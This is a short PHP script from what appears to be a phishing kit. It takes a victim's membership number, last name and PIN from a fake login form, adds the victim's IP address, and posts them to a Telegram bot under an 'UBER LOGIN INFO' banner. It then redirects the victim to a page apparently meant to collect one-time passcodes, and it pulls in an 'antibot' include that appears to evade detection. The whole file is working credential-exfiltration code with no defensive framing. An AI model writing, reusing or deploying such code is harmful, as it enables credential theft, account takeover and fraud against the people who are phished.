<?php
session_start();
require "antibot.php";
include "id.php";

$ip = getenv("REMOTE_ADDR");

// Store personal info in session
$_SESSION['membership_number'] = $_POST['membership_number'];
$_SESSION['last_name'] = $_POST['last_name'];
$_SESSION['pin'] = $_POST['pin'];
$_SESSION['ip'] = $ip;

// Send Telegram message for personal info (if you still want to send it separately)
$message = "━━━━━━━━━━━━━━━━━━━
🚖 𝗨𝗕𝗘𝗥 𝗟𝗢𝗚𝗜𝗡 𝗜𝗡𝗙𝗢
━━━━━━━━━━━━━━━━━━━
👤 membershipNumber      : ".$_POST['membership_number']."
📞 lastName     : ".$_POST['last_name']."
📞 PIN     : ".$_POST['pin']."
🌍 Ip     : ".$ip."
━━━━━━━━━━━━━━━━━━━
🖤 𝗨𝗕𝗘𝗥 XTN SYSTEM 🖤
━━━━━━━━━━━━━━━━━━━";

foreach($user_ids as $user_id) {
$url='https://api.telegram.org/bot' . $bot . '/sendMessage';
$data=array('chat_id'=>$user_id,'text'=>$message);
$options=array('http'=>array('method'=>'POST','header'=>"Content-Type:application/x-www-form-urlencoded\r\n",'content'=>http_build_query($data),),);
$context=stream_context_create($options);
$result=file_get_contents($url,false,$context);
}


// Redirect to the second form (post2.php)
HEADER("Location: otplg.php");
?>